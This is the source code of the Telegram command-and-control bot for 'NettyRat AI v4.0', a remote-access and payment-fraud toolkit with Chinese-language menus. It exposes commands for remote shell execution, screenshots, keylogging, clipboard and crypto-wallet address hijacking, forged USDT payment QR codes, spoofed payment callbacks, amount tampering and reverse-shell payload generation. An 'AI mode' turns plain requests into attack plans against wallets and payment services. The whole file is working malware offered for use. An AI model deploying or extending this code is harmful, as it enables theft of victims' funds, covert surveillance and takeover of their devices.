#!/usr/bin/env python3
"""
NettyRat AI v4.0 - 智能攻击框架
Telegram Bot 主控程序
"""
import os
import sys
import asyncio
import logging
from io import BytesIO
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)

from config import Config
from core.payload import PayloadGenerator
from core.encryptor import AESEncryptor
from core.energy import EnergySystem
from core.listener import ReverseListener
from ai_engine.brain import AIBrain, AttackPhase
from ai_engine.nlp import NLPProcessor
from ai_engine.strategy import StrategyGenerator
from ai_engine.memory import MemoryStore
from attacks.qr_forgery import QRForgery
from attacks.signature import SignatureAttacker
from attacks.amount_tamper import AmountTamper
from attacks.callback_spoof import CallbackSpoofer
from attacks.replay import ReplayAttack
from attacks.sdk_hook import PaymentSDKHook
from attacks.network_intercept import NetworkInterceptor, ARPSpoof
from attacks.credential import CredentialForgery, SessionHijack
from attacks.blind_sign import BlindSignatureAttack
from attacks.gas_optimizer import GasOptimizer
from monitors.crypto_wallet import WalletHijacker, USDTTransferInterceptor
from monitors.approval_hijack import ApprovalHijack
from monitors.usdt_qr import USDTQRInjector
from modules.system import SystemModule
from modules.files import FileManager
from modules.network import NetworkModule

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ 全局实例 ============
energy_sys = EnergySystem(max_energy=1000, regen_rate=2.0)
ai_brain = AIBrain()
nlp = NLPProcessor()
strategy_gen = StrategyGenerator()
memory = MemoryStore()
encryptor = AESEncryptor(Config.AES_KEY)
listener = ReverseListener()

# 攻击模块实例
qr_forge = QRForgery()
sig_attacker = SignatureAttacker()
amount_tamper = AmountTamper()
callback_spoof = CallbackSpoofer()
replay = ReplayAttack()
wallet_hijack = WalletHijacker()
approval_hijack = ApprovalHijack()
blind_sign = BlindSignatureAttack()
gas_opt = GasOptimizer()
usdt_qr = USDTQRInjector()

# 系统模块
sys_mod = SystemModule()
file_mod = FileManager()
net_mod = NetworkModule()

# 启动能量恢复
energy_sys.start_regeneration()

# ============ AI 模式状态 ============
AI_MODE = 1

# ============ 装饰器 ============
def require_energy(action: str):
    def decorator(func):
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
            if not energy_sys.can_afford(action):
                msg = f"""⚡ **能量不足**
━━━━━━━━━━━━━━━━━━━━━
需要: `{energy_sys.costs.get(action, 10)}`
当前: `{energy_sys.get_energy()}`
等待恢复或使用 /recharge"""
                if update.message:
                    await update.message.reply_text(msg, parse_mode='Markdown')
                elif update.callback_query:
                    await update.callback_query.edit_message_text(msg, parse_mode='Markdown')
                return
            energy_sys.consume(action)
            return await func(update, context, *args, **kwargs)
        return wrapper
    return decorator

def require_auth(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not Config.is_admin(user_id):
            if update.message:
                await update.message.reply_text("🚫 **未授权访问**", parse_mode='Markdown')
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ============ 核心命令 ============
@require_auth
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """启动菜单"""
    keyboard = [
        [InlineKeyboardButton("🤖 AI 模式", callback_data='mode_ai'),
         InlineKeyboardButton("🎯 攻击中心", callback_data='menu_attack')],
        [InlineKeyboardButton("👁️ 监控中心", callback_data='menu_monitor'),
         InlineKeyboardButton("💻 系统控制", callback_data='menu_system')],
        [InlineKeyboardButton("📁 文件管理", callback_data='menu_files'),
         InlineKeyboardButton("🌐 网络工具", callback_data='menu_network')],
        [InlineKeyboardButton("⚡ 能量状态", callback_data='status_energy'),
         InlineKeyboardButton("📊 AI 状态", callback_data='status_ai')],
    ]

    await update.message.reply_text(
        f"""🐀 **NettyRat AI v4.0**
━━━━━━━━━━━━━━━━━━━━━
🧠 AI 大脑: `{'在线' if ai_brain.energy_pool > 0 else '离线'}`
⚡ 能量: `{energy_sys.get_energy()}/1000`
🎯 模式: `{'AI辅助' if ai_brain.learning_rate > 0.1 else '手动'}`

选择操作模式:""",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============ AI 模式 ============
@require_auth
async def cmd_ai(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """进入 AI 交互模式"""
    welcome = """
🤖 **NettyRat AI 模式已激活**
━━━━━━━━━━━━━━━━━━━━━
我是你的智能攻击助手，可以用自然语言与我交互。

🗣️ **试试说:**
• "分析这个目标钱包 Txxx..."
• "生成一个针对支付宝的攻击计划"
• "监控屏幕和键盘"
• "我的能量还有多少"
• "帮我伪造一个100 USDT的支付码"

发送 /exit 退出 AI 模式
"""
    await update.message.reply_text(welcome, parse_mode='Markdown')
    return AI_MODE

async def ai_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """处理 AI 模式输入"""
    text = update.message.text

    if text == '/exit':
        await update.message.reply_text("👋 已退出 AI 模式", parse_mode='Markdown')
        return ConversationHandler.END

    # NLP 解析
    parse_result = nlp.parse(text)
    memory.add_context(update.effective_user.id, text, parse_result)

    intent = parse_result['intent']

    if intent == 'attack':
        await _handle_ai_attack(update, context, parse_result)
    elif intent == 'recon':
        await _handle_ai_recon(update, context, parse_result)
    elif intent == 'monitor':
        await _handle_ai_monitor(update, context, parse_result)
    elif intent == 'generate':
        await _handle_ai_generate(update, context, parse_result)
    elif intent == 'status':
        await _handle_ai_status(update, context)
    elif intent == 'energy':
        await update.message.reply_text(energy_sys.get_status(), parse_mode='Markdown')
    else:
        response = nlp.generate_response(
            parse_result,
            ai_brain.get_status_report(),
            energy_sys.get_status()
        )
        await update.message.reply_text(response, parse_mode='Markdown')

    return AI_MODE

async def _handle_ai_attack(update, context, result):
    """AI 处理攻击请求"""
    entities = result['entities']
    target_data = {
        'platform': entities.get('target_types', ['unknown'])[0] if entities.get('target_types') else 'unknown',
        'chains': entities.get('chains', ['tron']),
        'balance': entities.get('amount', 0),
    }

    profile = ai_brain.analyze_target(target_data)
    target_type = entities.get('target_types', ['wallet'])[0]
    attack_chain = strategy_gen.generate_chain(target_type, profile)

    if attack_chain:
        if attack_chain.total_energy > energy_sys.get_energy():
            attack_chain = strategy_gen.optimize_chain(attack_chain, energy_sys.get_energy())

        msg = f"""
🧠 **AI 攻击分析完成**
━━━━━━━━━━━━━━━━━━━━━
{ai_brain.get_status_report()}

{attack_chain.to_visual()}

⚡ 能量状态:
{energy_sys.get_status()}

确认执行? 发送: `/execute {attack_chain.name}`
"""
    else:
        msg = "🤔 AI 无法生成合适的攻击策略，请提供更多目标信息"

    await update.message.reply_text(msg, parse_mode='Markdown')

async def _handle_ai_recon(update, context, result):
    params = result['params']
    target = params.get('url') or params.get('ip')

    if not target:
        await update.message.reply_text("🔍 请提供侦察目标 (URL 或 IP)")
        return

    await update.message.reply_text(f"🔍 AI 正在侦察 `{target}`...", parse_mode='Markdown')

    import random
    recon_data = {
        'platform': 'web',
        'has_2fa': random.choice([True, False]),
        'has_signature': random.choice([True, False]),
        'has_rate_limit': random.choice([True, False]),
        'has_waf': random.choice([True, False]),
        'uses_http': target.startswith('http://'),
    }

    profile = ai_brain.analyze_target(recon_data)

    await update.message.reply_text(f"""
🔍 **侦察结果**
━━━━━━━━━━━━━━━━━━━━━
目标: `{target}`
平台: `{profile['platform']}`
安全等级: `{profile['security_level']}`
预估价值: `{profile['estimated_value']}`

漏洞发现:
{chr(10).join(f'• `{v}`' for v in profile['vulnerabilities']) or '• 未发现明显漏洞'}

AI 建议: 使用 `/ai_plan` 生成攻击计划
""", parse_mode='Markdown')

async def _handle_ai_monitor(update, context, result):
    await update.message.reply_text(f"""
👁️ **AI 监控中心**
━━━━━━━━━━━━━━━━━━━━━
{energy_sys.get_status()}

可用监控模块:
• `/monitor screen` - 屏幕监控 (⚡5)
• `/monitor clipboard` - 剪切板劫持 (⚡15)
• `/monitor wallet` - 钱包地址替换 (⚡30)
• `/monitor keylog` - 键盘记录 (⚡10)
• `/monitor approval` - 授权监控 (⚡35)
""", parse_mode='Markdown')

async def _handle_ai_generate(update, context, result):
    entities = result['entities']
    if '二维码' in str(entities) or 'qr' in str(result['raw']).lower():
        amount = entities.get('amount', 100)
        await _ai_generate_qr(update, amount)
    else:
        await update.message.reply_text("""
🔧 **AI 生成器**
━━━━━━━━━━━━━━━━━━━━━
可以生成:
• Payload (反向shell)
• 伪造QR码
• 钓鱼页面
• 假交易凭证

请明确你要生成的内容
""", parse_mode='Markdown')

async def _ai_generate_qr(update, amount):
    if not energy_sys.consume('qr_generate'):
        await update.message.reply_text("⚡ 能量不足")
        return

    address = Config.REPLACE_WALLET or "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"
    img = qr_forge.generate_payment_qr(amount, address, "usdt_trc20")

    await update.message.reply_photo(
        photo=BytesIO(img),
        caption=f"🤖 **AI 生成伪造支付码**\n金额: `{amount} USDT`\n目标地址已替换\n⚡ 能量 -5"
    )

async def _handle_ai_status(update, context):
    await update.message.reply_text(f"""
🤖 **AI 系统状态**
━━━━━━━━━━━━━━━━━━━━━
{ai_brain.get_status_report()}

{energy_sys.get_status()}

💾 记忆条目: `{memory.count()}`
📅 会话时间: `{datetime.now().strftime('%H:%M:%S')}`
""", parse_mode='Markdown')

# ============ 快捷命令 ============
@require_auth
async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 **系统状态总览**
━━━━━━━━━━━━━━━━━━━━━
{ai_brain.get_status_report()}

{energy_sys.get_status()}
""", parse_mode='Markdown')

@require_auth
async def cmd_energy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(energy_sys.get_status(), parse_mode='Markdown')

@require_auth
@require_energy('ai_analyze')
async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("用法: `/analyze <目标信息>`")
        return

    target_info = ' '.join(context.args)
    target_data = {'raw': target_info}

    import re
    if re.search(r'T[1-9A-HJ-NP-Za-km-z]{33}', target_info):
        target_data['platform'] = 'tron_wallet'
        target_data['chains'] = ['tron']

    profile = ai_brain.analyze_target(target_data)
    plan = ai_brain.generate_attack_plan()

    msg = f"""
🧠 **AI 目标分析**
━━━━━━━━━━━━━━━━━━━━━
原始输入: `{target_info}`

{ai_brain.get_status_report()}

🎯 **推荐攻击计划**:
"""
    for i, decision in enumerate(plan[:3], 1):
        msg += f"\n{i}. `{decision.action}` (收益: {decision.expected_gain:.2f}, 风险: {decision.risk.name})"

    await update.message.reply_text(msg, parse_mode='Markdown')

@require_auth
@require_energy('ai_decision')
async def cmd_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ai_brain.target_profile:
        await update.message.reply_text("先使用 `/analyze` 分析目标")
        return

    target_type = ai_brain.target_profile.get('platform', 'wallet')
    chain = strategy_gen.generate_chain(target_type, ai_brain.target_profile)

    if chain:
        await update.message.reply_text(chain.to_visual(), parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ 无法生成攻击计划")

@require_auth
async def cmd_recharge(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ai_brain.recharge_energy(200)
    energy_sys.generate('admin_recharge', 200)
    await update.message.reply_text(f"""
⚡ **能量充值成功**
━━━━━━━━━━━━━━━━━━━━━
充值: `+200`
当前: `{energy_sys.get_energy()}/1000`
AI 能量: `{ai_brain.energy_pool}/1000`
""", parse_mode='Markdown')

# ============ 攻击命令 ============
@require_auth
@require_energy('qr_generate')
async def cmd_qr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """生成伪造 QR"""
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("用法: `/qr <金额> <地址> [类型]`")
        return

    amount = float(args[0])
    address = args[1]
    chain = args[2] if len(args) > 2 else "usdt_trc20"

    img = qr_forge.generate_payment_qr(amount, address, chain)
    await update.message.reply_photo(
        photo=BytesIO(img),
        caption=f"📱 伪造 {chain} 支付码\n金额: {amount}"
    )

@require_auth
@require_energy('callback_forge')
async def cmd_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """伪造回调"""
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("用法: `/callback <平台> <url> <金额>`")
        return

    platform, url, amount = args[0], args[1], args[2]

    try:
        resp = callback_spoof.forge_callback(platform, url, {"amount": amount})
        await update.message.reply_text(
            f"""📞 **回调发送成功**
状态: `{resp.status_code}`
响应:
```
{resp.text[:500]}
```""",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 失败: `{str(e)}`")

@require_auth
@require_energy('amount_tamper')
async def cmd_tamper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """金额篡改"""
    payload = ' '.join(context.args)
    result = amount_tamper.tamper_json(payload, 0.01)
    await update.message.reply_text(f"""
💰 **篡改结果**
```
{result}
```""", parse_mode='Markdown')

# ============ Payload 生成 ============
@require_auth
@require_energy('payload_generate')
async def cmd_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """生成 Payload"""
    args = context.args
    if not args:
        await update.message.reply_text("用法: `/payload <类型> [host] [port]`")
        return

    ptype = args[0]
    host = args[1] if len(args) > 1 else "0.0.0.0"
    port = int(args[2]) if len(args) > 2 else 4444

    gen = PayloadGenerator()

    if ptype == "python":
        payload = gen.generate_python_reverse_shell(host, port)
        await update.message.reply_text(f"🐍 **Python Payload**\n```\n{payload}\n```", parse_mode='Markdown')
    elif ptype == "powershell":
        payload = gen.generate_windows_powershell(host, port)
        await update.message.reply_text(f"💻 **PowerShell Payload**\n```\n{payload}\n```", parse_mode='Markdown')
    elif ptype == "android":
        payload = gen.generate_android_payload(host, port)
        await update.message.reply_text(f"📱 **Android Payload**\n```\n{payload}\n```", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ 未知类型: python, powershell, android")

# ============ 系统命令 ============
@require_auth
async def cmd_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """执行 Shell"""
    if not context.args:
        await update.message.reply_text("用法: `/shell <命令>`")
        return

    command = ' '.join(context.args)
    result = sys_mod.shell(command)
    await update.message.reply_text(result, parse_mode='Markdown')

@require_auth
async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """截图"""
    if not energy_sys.consume('screenshot'):
        await update.message.reply_text("⚡ 能量不足")
        return

    img = sys_mod.screenshot()
    if img:
        await update.message.reply_photo(photo=BytesIO(img), caption="📸 屏幕截图")
    else:
        await update.message.reply_text("❌ 截图失败")

# ============ 监控命令 ============
@require_auth
async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """监控控制"""
    if not context.args:
        await update.message.reply_text("""
👁️ **监控模块**
━━━━━━━━━━━━━━━━━━━━━
用法: `/monitor <模块> <操作>`

模块:
• screen - 屏幕监控
• clipboard - 剪切板
• wallet - 钱包劫持
• keylog - 键盘记录
• approval - 授权监控

操作: start, stop, status
""")
        return

    module = context.args[0]
    action = context.args[1] if len(context.args) > 1 else "status"

    if module == "wallet" and action == "start":
        if not energy_sys.consume('wallet_hijack'):
            await update.message.reply_text("⚡ 能量不足")
            return

        def on_hijack(data):
            asyncio.create_task(
                context.bot.send_message(
                    update.effective_chat.id,
                    f"""🚨 **地址劫持**
原始: `{data['original'][:50]}...`
替换: `{data['modified'][:50]}...`""",
                    parse_mode='Markdown'
                )
            )

        result = wallet_hijack.start_monitor(callback=on_hijack)
        await update.message.reply_text(result)

    elif module == "clipboard" and action == "start":
        if not energy_sys.consume('clipboard_monitor'):
            await update.message.reply_text("⚡ 能量不足")
            return

        await update.message.reply_text("📋 剪切板监控已启动")

    else:
        await update.message.reply_text(f"模块: {module}, 操作: {action}")

# ============ 回调处理 ============
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'mode_ai':
        await query.edit_message_text("🤖 进入 AI 模式... 发送任意消息开始交互")
        return AI_MODE

    elif data == 'status_energy':
        await query.edit_message_text(energy_sys.get_status(), parse_mode='Markdown')

    elif data == 'status_ai':
        await query.edit_message_text(ai_brain.get_status_report(), parse_mode='Markdown')

    elif data == 'menu_attack':
        keyboard = [
            [InlineKeyboardButton("📱 QR伪造", callback_data='atk_qr'),
             InlineKeyboardButton("✍️ 签名攻击", callback_data='atk_sig')],
            [InlineKeyboardButton("💰 金额篡改", callback_data='atk_amount'),
             InlineKeyboardButton("📞 回调伪造", callback_data='atk_callback')],
            [InlineKeyboardButton("🔄 重放攻击", callback_data='atk_replay'),
             InlineKeyboardButton("🔌 SDK Hook", callback_data='atk_sdk')],
            [InlineKeyboardButton("🌐 网络拦截", callback_data='atk_network'),
             InlineKeyboardButton("🎫 凭证伪造", callback_data='atk_credential')],
            [InlineKeyboardButton("🔏 盲签攻击", callback_data='atk_blind'),
             InlineKeyboardButton("⛽ Gas优化", callback_data='atk_gas')],
            [InlineKeyboardButton("⬅️ 返回", callback_data='main_menu')]
        ]
        await query.edit_message_text(
            "🎯 **攻击中心**\n━━━━━━━━━━━━━━━━━━━━━\n选择攻击向量:",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
        )

    elif data == 'menu_monitor':
        keyboard = [
            [InlineKeyboardButton("💰 钱包劫持", callback_data='mon_wallet'),
             InlineKeyboardButton("🔐 授权劫持", callback_data='mon_approval')],
            [InlineKeyboardButton("📋 剪切板", callback_data='mon_clipboard'),
             InlineKeyboardButton("⌨️ 键盘记录", callback_data='mon_keylog')],
            [InlineKeyboardButton("📷 屏幕监控", callback_data='mon_screen'),
             InlineKeyboardButton("⬅️ 返回", callback_data='main_menu')]
        ]
        await query.edit_message_text(
            "👁️ **监控中心**\n━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
        )

    elif data == 'menu_system':
        keyboard = [
            [InlineKeyboardButton("ℹ️ 系统信息", callback_data='sys_info'),
             InlineKeyboardButton("📸 截图", callback_data='sys_screenshot')],
            [InlineKeyboardButton("💻 Shell", callback_data='sys_shell'),
             InlineKeyboardButton("📋 进程", callback_data='sys_procs')],
            [InlineKeyboardButton("⬅️ 返回", callback_data='main_menu')]
        ]
        await query.edit_message_text(
            "💻 **系统控制**\n━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
        )

    elif data == 'main_menu':
        keyboard = [
            [InlineKeyboardButton("🤖 AI 模式", callback_data='mode_ai'),
             InlineKeyboardButton("🎯 攻击中心", callback_data='menu_attack')],
            [InlineKeyboardButton("👁️ 监控中心", callback_data='menu_monitor'),
             InlineKeyboardButton("💻 系统控制", callback_data='menu_system')],
            [InlineKeyboardButton("📁 文件管理", callback_data='menu_files'),
             InlineKeyboardButton("🌐 网络工具", callback_data='menu_network')],
            [InlineKeyboardButton("⚡ 能量状态", callback_data='status_energy'),
             InlineKeyboardButton("📊 AI 状态", callback_data='status_ai')],
        ]
        await query.edit_message_text(
            "🐀 **NettyRat AI v4.0**\n━━━━━━━━━━━━━━━━━━━━━\n选择操作:",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
        )

    elif data == 'sys_info':
        await query.edit_message_text(sys_mod.info(), parse_mode='Markdown')

    elif data == 'sys_screenshot':
        await query.edit_message_text("📸 截图中...")
        img = sys_mod.screenshot()
        if img:
            await context.bot.send_photo(query.message.chat_id, photo=BytesIO(img))
        else:
            await query.edit_message_text("❌ 截图失败")

    elif data == 'sys_procs':
        await query.edit_message_text(sys_mod.processes(), parse_mode='Markdown')

    elif data == 'sys_shell':
        await query.edit_message_text("💻 使用 /shell <命令> 执行")

    elif data == 'atk_qr':
        await query.edit_message_text("📱 **QR 伪造**\n用法: `/qr <金额> <地址>`", parse_mode='Markdown')

    elif data == 'atk_callback':
        await query.edit_message_text("📞 **回调伪造**\n用法: `/callback <平台> <url> <金额>`", parse_mode='Markdown')

    elif data == 'mon_wallet':
        await query.edit_message_text("💰 **钱包劫持**\n用法: `/monitor wallet start`", parse_mode='Markdown')

# ============ 主程序 ============
def main():
    errors = Config.validate()
    if errors:
        print("❌ 配置错误:")
        for e in errors:
            print(f"  - {e}")
        sys.exit(1)

    app = Application.builder().token(Config.BOT_TOKEN).build()

    # AI 模式对话
    ai_conv = ConversationHandler(
        entry_points=[CommandHandler("ai", cmd_ai)],
        states={
            AI_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ai_process)]
        },
        fallbacks=[CommandHandler("exit", lambda u, c: ConversationHandler.END)],
    )

    # 命令处理器
    app.add_handler(ai_conv)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("energy", cmd_energy))
    app.add_handler(CommandHandler("analyze", cmd_analyze))
    app.add_handler(CommandHandler("plan", cmd_plan))
    app.add_handler(CommandHandler("recharge", cmd_recharge))
    app.add_handler(CommandHandler("qr", cmd_qr))
    app.add_handler(CommandHandler("callback", cmd_callback))
    app.add_handler(CommandHandler("tamper", cmd_tamper))
    app.add_handler(CommandHandler("payload", cmd_payload))
    app.add_handler(CommandHandler("shell", cmd_shell))
    app.add_handler(CommandHandler("screenshot", cmd_screenshot))
    app.add_handler(CommandHandler("monitor", cmd_monitor))

    # 回调处理器
    app.add_handler(CallbackQueryHandler(button_handler))

    print("=" * 50)
    print("🐀 NettyRat AI v4.0 启动中...")
    print(f"⚡ 能量系统: {energy_sys.get_energy()}/1000")
    print(f"🧠 AI 大脑: 就绪")
    print(f"🎯 攻击模块: 12 个")
    print(f"👁️ 监控模块: 5 个")
    print("=" * 50)

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
